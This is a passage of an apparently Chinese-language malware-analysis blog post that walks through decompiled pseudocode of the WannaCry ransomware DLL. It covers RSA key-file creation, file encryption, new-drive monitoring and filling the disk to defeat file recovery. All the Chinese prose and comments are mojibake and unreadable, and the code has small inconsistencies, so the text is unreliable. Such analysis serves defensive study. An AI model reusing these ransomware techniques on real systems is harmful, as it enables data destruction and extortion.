)Â Â </span><br><span class="line"></span><br><span class="line">CloseHandle(hThread_5);Â Â </span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">100u</span>);Â Â </span><br><span class="line"></span><br><span class="line">RepeatOperation();Â <span class="comment">//Â åˆ›å»ºæ‰¹å¤„ç†è„šæœ¬</span></span><br><span class="line">åŠ å¯†å™¨Â Read_Me@.txtÂ åŠ å¯†å…¶ä»–ç”¨æˆ·ä¸‹çš„æ–‡ä»¶Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hThread_3Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread_3,Â INFINITE);Â Â </span><br><span class="line"></span><br><span class="line">CloseHandle(hThread_3);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>Dll æ–‡ä»¶ä¸»é¢˜åŒ…æ‹¬äº†ç—…æ¯’çš„æ‰€æœ‰æ“ä½œï¼š</p><ol><li><p> åˆå§‹ ä¸´ç•ŒåŒºï¼Œç¼“å†²åŒºï¼Œè·¯å¾„ï¼Œå­—ç¬¦ä¸²å¹¶å°†c.wnryè¯»åˆ°å†…å­˜</p></li><li><p> å»ºç«‹ å…¬é’¥ï¼Œç§é’¥æ–‡ä»¶ï¼Œå¹¶åŠ å¯†æ‰€æœ‰æ–‡ä»¶</p></li><li><p> æ¯éš”ä¸‰ç§’ éšè—æ–¹å¼å¯åŠ¨ taskdl.exe taskse.exe ç­‰æ–‡ä»¶</p></li><li><p> åˆ›å»ºæ‰¹å¤„ç†è„šæœ¬ åŠ å¯†å™¨ Read_Me@.txt åŠ å¯†å…¶ä»–ç”¨æˆ·ä¸‹çš„æ–‡ä»¶</p></li></ol><h3 id="6-1-2-GetUsersidAndCmp-è·å–å½“å‰ç”¨æˆ·SIDå¹¶ä¸ç³»ç»Ÿçš„SIDä½œæ¯”è¾ƒ"><a href="#6-1-2-GetUsersidAndCmp-è·å–å½“å‰ç”¨æˆ·SIDå¹¶ä¸ç³»ç»Ÿçš„SIDä½œæ¯”è¾ƒ" class="headerlink" title="6.1.2 GetUsersidAndCmp è·å–å½“å‰ç”¨æˆ·SIDå¹¶ä¸ç³»ç»Ÿçš„SIDä½œæ¯”è¾ƒ"></a>6.1.2 GetUsersidAndCmp è·å–å½“å‰ç”¨æˆ·SIDå¹¶ä¸ç³»ç»Ÿçš„SIDä½œæ¯”è¾ƒ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;v4,Â <span class="number">0</span>,Â <span class="number">0x254</span>u);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <span class="comment">//Â å°†buffç¼“å†²åŒºæ¸…é›¶Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â GetCurrentUserSID(&amp;Buffer)Â )Â Â Â Â Â Â Â  <span class="comment">//Â è·å–å½“å‰ç”¨æˆ·çš„SIDÂ Â </span></span><br><span class="line">&#123;Â Â </span><br><span class="line">v0Â =Â wcsicmp(aS1518,Â &amp;Buffer);Â Â Â Â Â Â Â Â Â <span class="comment">//Â æ¯”è¾ƒå½“å‰çš„SIDæ˜¯å¦æ˜¯S-1-5-18-&gt;ç³»ç»Ÿçš„SIDÂ Â </span></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>ä»æ³¨å†Œè¡¨ä¸­è·å–åˆ°å½“å‰ç”¨æˆ·çš„SIDå¹¶äºç³»ç»Ÿçš„SIDåšæ¯”è¾ƒ</p><h3 id="6-1-3-CreatePkyAndEky-åˆ›å»º-pky-å’Œ-eky-æ–‡ä»¶"><a href="#6-1-3-CreatePkyAndEky-åˆ›å»º-pky-å’Œ-eky-æ–‡ä»¶" class="headerlink" title="6.1.3 CreatePkyAndEky åˆ›å»º pky å’Œ eky æ–‡ä»¶"></a>6.1.3 CreatePkyAndEky åˆ›å»º pky å’Œ eky æ–‡ä»¶</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>Â (Â !GetCSPHandle((<span class="keyword">char</span>) <span class="keyword">this</span>)Â )Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–CSPæœåŠ¡ç¨‹åºå¥æŸ„Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">DestoryHandle(v3);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å¦‚æœå¤±è´¥åˆ™é‡Šæ”¾èµ„æºÂ Â </span></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â lpFileNameÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !ImportPubKey(v3,Â lpFileName)Â )Â Â Â Â Â Â Â Â <span class="comment">//Â å½“00000000.pkyä¸å­˜åœ¨æ—¶Â æ¡ä»¶æˆç«‹Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !CryptImportKey_Addr(v3[<span class="number">1</span>],Â &amp;pbData,Â <span class="number">0x114</span>,Â <span class="number">0</span>,Â <span class="number">0</span>,Â v3Â +Â <span class="number">3</span>)<span class="comment">//Â å¯¼å…¥RSAå…¬é’¥Â Â </span></span><br><span class="line">||Â !CryptGenKey(v3[<span class="number">1</span>],Â (<span class="keyword">int</span>)(v3Â +Â <span class="number">2</span>))Â Â Â <span class="comment">//Â ç”Ÿæˆå¯å¯¼å‡ºçš„2048ä½RSAç­¾åå¯†é’¥Â Â </span></span><br><span class="line">||Â !CreatePkyFile(v3[<span class="number">1</span>],Â v3[<span class="number">2</span>],Â <span class="number">6u</span>,Â lpFileName)Â )<span class="comment">//Â åˆ›å»º00000000.pkyæ–‡ä»¶Â å¹¶å†™å…¥ç”Ÿæˆçš„RSAå…¬é’¥Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_19;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â pky_strÂ )Â Â </span><br><span class="line"></span><br><span class="line">CreateEkyFile((<span class="keyword">int</span>)v3,Â pky_str);Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ›å»º00000000.ekyæ–‡ä»¶Â å¹¶å†™å…¥åŠ å¯†åçš„RSAç§é’¥Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !ImportPubKey(v3,Â lpFileName)Â )Â Â Â Â Â Â <span class="comment">//Â å¯¼å…¥00000000.pkyçš„å…¬é’¥Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">BEL_19:Â Â </span><br><span class="line"></span><br><span class="line">DestoryHandle(v3);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å¦‚æœå¯¼å…¥å¤±è´¥é‡Šæ”¾å¥æŸ„Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">v5Â =Â v3[<span class="number">3</span>];Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å½“00000000.pkyå­˜åœ¨æ—¶Â ç›´æ¥é€€å‡ºå‡½æ•°Â Â </span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°åœ¨å½“å‰è·¯å¾„é‡Œåˆ›å»º pky å’Œ ekyæ–‡ä»¶ï¼Œ pkyä¸ºå…¬é’¥ï¼Œekyä¸ºåŠ å¯†åçš„ç§é’¥</p><h3 id="6-1-4-CreateResFile-çº¿ç¨‹å›è°ƒ-åˆ›å»º-res-æ–‡ä»¶"><a href="#6-1-4-CreateResFile-çº¿ç¨‹å›è°ƒ-åˆ›å»º-res-æ–‡ä»¶" class="headerlink" title="6.1.4 CreateResFile çº¿ç¨‹å›è°ƒ+åˆ›å»º res æ–‡ä»¶"></a>6.1.4 CreateResFile çº¿ç¨‹å›è°ƒ+åˆ›å»º res æ–‡ä»¶</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>Â __stdcallÂ __noreturnÂ <span class="title">CreateResFile</span><span class="params">(LPVOIDÂ lpThreadParameter)</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span>Â index;Â <span class="comment">//Â esiÂ Â </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â !dword_1000DD90Â )Â Â </span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">SystemTimeÂ =Â time(<span class="number">0</span>);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è¿”å›å½“å‰ç³»ç»Ÿæ—¶é—´Â Â </span></span><br><span class="line"></span><br><span class="line">CreateRes();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ›å»ºå¹¶å†™å…¥00000000.resæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">indexÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â ä¼‘çœ 22ç§’Â Â </span></span><br><span class="line">&#123;Â Â </span><br><span class="line"><span class="keyword">if</span>Â (Â dword_1000DD90Â )Â Â </span><br><span class="line"><span class="keyword">goto</span>Â LABEL_6;Â Â </span><br><span class="line">Sleep(<span class="number">1000u</span>);Â Â </span><br><span class="line">++index;Â Â </span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â indexÂ &lt;Â <span class="number">0x19</span>Â );Â Â </span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">LABEL_6:Â Â </span><br><span class="line">ExitThread(<span class="number">0</span>);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â é€€å‡ºçº¿ç¨‹Â Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â </span><br></pre></td></tr></table></figure><p>åœ¨å½“å‰å·¥ä½œè·¯å¾„åˆ›å»ºäº† res æ–‡ä»¶ï¼Œå¹¶å¾€é‡Œå†™æ•°æ®ï¼š</p><p>å†™å…¥äº† 0x8ä¸ªå­—èŠ‚çš„éšæœºæ•° å’Œ 0x4 ä¸ªå­—èŠ‚çš„å½“å‰æ—¶é—´</p><h3 id="6-1-5-CheckDky-çº¿ç¨‹å›è°ƒ-æ£€æµ‹æ–‡ä»¶å­˜åœ¨ä¸å¦"><a href="#6-1-5-CheckDky-çº¿ç¨‹å›è°ƒ-æ£€æµ‹æ–‡ä»¶å­˜åœ¨ä¸å¦" class="headerlink" title="6.1.5 CheckDky çº¿ç¨‹å›è°ƒ+æ£€æµ‹æ–‡ä»¶å­˜åœ¨ä¸å¦"></a>6.1.5 CheckDky çº¿ç¨‹å›è°ƒ+æ£€æµ‹æ–‡ä»¶å­˜åœ¨ä¸å¦</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __stdcallÂ __noreturnÂ <span class="title">CheckDky</span><span class="params">(LPVOIDÂ lpThreadParameter)</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â <span class="number">1</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">dword_1000DD8CÂ =Â sub_10004500((<span class="keyword">int</span>)lpThreadParameter);</span><br><span class="line">    <span class="comment">//Â æ£€æµ‹æ˜¯å¦å­˜åœ¨774F34B5.dkyè¿™ä¸ªæ–‡ä»¶Â ç”±äºæ–‡ä»¶ä¸å­˜åœ¨Â ç›´æ¥returnÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â dword_1000DD8CÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;Â Â </span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">5000u</span>);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">ExitThread(<span class="number">0</span>);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>æ¯éš”5ç§’æ£€æµ‹æ—¶å€™å­˜åœ¨ dky æ–‡ä»¶ï¼Œå­˜åœ¨å°± å¼•å…¥ å…¬é’¥å¹¶ è¿›è¡Œ åŠ è§£å¯†æ“ä½œ</p><h2 id="6-2-EncrypteAllFiles-çº¿ç¨‹å›è°ƒ-åŠ å¯†-Important"><a href="#6-2-EncrypteAllFiles-çº¿ç¨‹å›è°ƒ-åŠ å¯†-Important" class="headerlink" title="6.2 EncrypteAllFiles çº¿ç¨‹å›è°ƒ+åŠ å¯† (Important)"></a>6.2 EncrypteAllFiles çº¿ç¨‹å›è°ƒ+åŠ å¯† (Important)</h2><blockquote><p>ä½œä¸ºç—…æ¯’çš„æ ¸å¿ƒå‡½æ•°åµŒå¥—äº†ï¼Œé‡Œå¤–åµŒå¥—äº†å¾ˆå¤šå±‚</p></blockquote><h3 id="6-2-1-ç¬¬ä¸€å±‚"><a href="#6-2-1-ç¬¬ä¸€å±‚" class="headerlink" title="6.2.1 ç¬¬ä¸€å±‚"></a>6.2.1 ç¬¬ä¸€å±‚</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DrivesÂ =Â GetLogicalDrives();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–é©±åŠ¨ä¸­æ‰€æœ‰ç£ç›˜Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !dword_1000DD8CÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â <span class="number">1</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">3000u</span>);Â Â </span><br><span class="line"></span><br><span class="line">Drives_1Â =Â Drives;Â Â </span><br><span class="line"></span><br><span class="line">DrivesÂ =Â GetLogicalDrives();Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â DrivesÂ !=Â Drives_1Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â æ£€æµ‹æ˜¯å¦æœ‰æ–°çš„ç£ç›˜åŠ å…¥Â Â </span></span><br></pre></td></tr></table></figure><p>å¾ªç¯æ£€æµ‹æ˜¯å¦æœ‰æ–°çš„ç£ç›˜åŠ å…¥ï¼Œæœ‰å°±åŠ å¯†ï¼Œæ²¡æœ‰å°±ä¸€ç›´å¾ªç¯</p><h3 id="6-2-2-ç¬¬äºŒå±‚"><a href="#6-2-2-ç¬¬äºŒå±‚" class="headerlink" title="6.2.2 ç¬¬äºŒå±‚"></a>6.2.2 ç¬¬äºŒå±‚</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORDÂ __stdcallÂ <span class="title">sub_10005680</span><span class="params">(LPVOIDÂ Num_3)</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>Â Parameter;Â <span class="comment">//Â [esp+0h]Â [ebp-930h]Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>Â v3;Â <span class="comment">//Â [esp+92Ch]Â [ebp-4h]Â Â </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">InitCritical(&amp;Parameter);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆå§‹åŒ–ä¸´ç•ŒåŒºÂ Â </span></span><br><span class="line"></span><br><span class="line">v3Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â MovFileToTemp(&amp;Parameter,Â FileName,Â (<span class="keyword">int</span>)sub_10005340,Â (<span class="keyword">int</span>)&amp;dword_1000DD8C)Â )<span class="comment">//Â ç§»åŠ¨æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•ä¸‹å¹¶é‡å‘½åä¸º.WNCRTYÂ Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">EncryptFile((<span class="keyword">int</span>)&amp;Parameter,Â (LONG)Num_3,Â <span class="number">0</span>);<span class="comment">//Â åŠ å¯†ç£ç›˜ä¸Šçš„æ‰€æœ‰æ–‡ä»¶Â Â Â </span></span><br><span class="line"></span><br><span class="line">FillDisk((<span class="keyword">int</span>)Num_3);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åœ¨å›æ”¶ç«™åˆ›å»ºä¸€ä¸ªæ–‡ä»¶Â å¹¶ä¸”å¾ªç¯å†™å…¥æ•°æ®ç›´åˆ°ç£ç›˜ç©ºé—´ä¸è¶³Â Â </span></span><br><span class="line"></span><br><span class="line">ReleaseResouce(&amp;Parameter);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â é‡Šæ”¾èµ„æºÂ Â </span></span><br><span class="line"></span><br><span class="line">ExitThread(<span class="number">0</span>);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">v3Â =Â <span class="number">-1</span>;Â Â </span><br><span class="line"></span><br><span class="line">DeleteCritical(&amp;Parameter);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â é‡Šæ”¾ä¸´ç•ŒåŒºÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬äºŒå±‚ä¸­æœ‰ä¸‰ä¸ªæ¯”è¾ƒé‡è¦çš„å‡½æ•°ï¼Œèµ·åˆ°äº†é˜²æ­¢æ¢å¤è½¯ä»¶å¯¹åˆ é™¤æ–‡ä»¶è¿›è¡Œæ¢å¤ç­‰ä½œç”¨</p></blockquote><h4 id="6-2-2-1-MoveFileToTemp-ç§»åŠ¨æ–‡ä»¶å¹¶é‡å‘½å"><a href="#6-2-2-1-MoveFileToTemp-ç§»åŠ¨æ–‡ä»¶å¹¶é‡å‘½å" class="headerlink" title="6.2.2.1 MoveFileToTemp ç§»åŠ¨æ–‡ä»¶å¹¶é‡å‘½å"></a>6.2.2.1 MoveFileToTemp ç§»åŠ¨æ–‡ä»¶å¹¶é‡å‘½å</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">resultÂ =Â (HGLOBAL)CreatePkyAndEky((_DWORDÂ *)lpParameterÂ +Â <span class="number">1</span>,Â lpFileName,Â <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â åˆ›å»º00000000.pkyå’Œ00000000.ekyæ–‡ä»¶Â æ­¤æ—¶æ–‡ä»¶å·²å­˜åœ¨Â ç›´æ¥é€€å‡ºå‡½æ•°Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â resultÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â lpFileNameÂ )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â lpFileName=00000000.pkyÂ Â </span></span><br><span class="line"></span><br><span class="line">CreatePkyAndEky((_DWORDÂ *)v4Â +Â <span class="number">11</span>,Â <span class="number">0</span>,Â <span class="number">0</span>);Â <span class="comment">//Â å†ä¸€æ¬¡æ£€æµ‹æ˜¯å¦å­˜åœ¨è¿™ä¸¤ä¸ªæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">resultÂ =Â GlobalAlloc(<span class="number">0</span>,Â <span class="number">0x100000</span>u);Â Â Â Â Â Â Â Â Â <span class="comment">//Â ç”³è¯·0x10000å¤§å°çš„ç©ºé—´Â Â </span></span><br><span class="line"></span><br><span class="line">*((_DWORDÂ *)v4Â +Â <span class="number">0x132</span>)Â =Â result;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â resultÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">resultÂ =Â GlobalAlloc(<span class="number">0</span>,Â <span class="number">0x100000</span>u);Â Â Â Â Â Â Â <span class="comment">//Â å†æ¬¡ç”³è¯·0x10000å¤§å°çš„ç©ºé—´Â Â </span></span><br><span class="line"></span><br><span class="line">*((_DWORDÂ *)v4Â +Â <span class="number">0x133</span>)Â =Â result;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â resultÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">InitializeCriticalSection((LPCRITICAL_SECTION)(v4Â +Â <span class="number">1260</span>));Â Â </span><br><span class="line"></span><br><span class="line">*((_DWORDÂ *)v4Â +Â <span class="number">310</span>)Â =Â CreateThread(<span class="number">0</span>,Â <span class="number">0</span>,Â (LPTHREAD_START_ROUTINE)StartAddress,Â v4,Â <span class="number">0</span>,Â <span class="number">0</span>);</span><br><span class="line"><span class="comment">//Â å°†æ–‡ä»¶ç§»åŠ¨åˆ°ä¸´æ—¶ç›®å½•ä¸‹å¹¶é‡å‘½åä¸ºWNCRTYÂ Â </span></span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å•ç‹¬åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ å°†ä¸€éƒ¨åˆ†æ–‡æœ¬æ–‡ä»¶ç§»åŠ¨åˆ°ä¸´æ—¶ç›®å½•å¹¶é‡å‘½å</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™æ—¶æ–‡ä»¶å¹¶æ²¡æœ‰è¿›è¡ŒåŠ å¯†ï¼Œæ˜¯å¯ä»¥ç›´æ¥é€šè¿‡ä¿®æ”¹åç¼€åä¿®å¤çš„</p><h4 id="6-2-2-2-FillDisk-å›æ”¶ç«™å¾ªç¯å†™å…¥"><a href="#6-2-2-2-FillDisk-å›æ”¶ç«™å¾ªç¯å†™å…¥" class="headerlink" title="6.2.2.2 FillDisk å›æ”¶ç«™å¾ªç¯å†™å…¥"></a>6.2.2.2 FillDisk å›æ”¶ç«™å¾ªç¯å†™å…¥</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 